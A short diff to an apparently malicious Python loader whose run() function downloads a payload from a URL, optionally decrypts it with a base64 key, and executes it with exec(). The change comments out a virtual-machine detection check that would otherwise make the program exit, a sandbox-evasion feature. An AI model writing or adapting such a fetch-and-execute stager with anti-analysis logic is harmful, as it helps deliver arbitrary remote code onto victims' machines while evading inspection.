@@ -45,11 +45,11 @@ def environment():
 
 def run(url=None, key=None):
     if url:
-        if environment():
-            if '--debug' in sys.argv:
-                if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
-                    sys.exit(0)
-            else:
-                sys.exit(0)
+        # if environment():
+            # if '--debug' in sys.argv:
+            #     if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
+            #         sys.exit(0)
+            # else:
+            #     sys.exit(0)
         payload = decrypt(urlopen(url).read(), base64.b64decode(key)) if key else urlopen(url).read()
         exec(payload, globals())
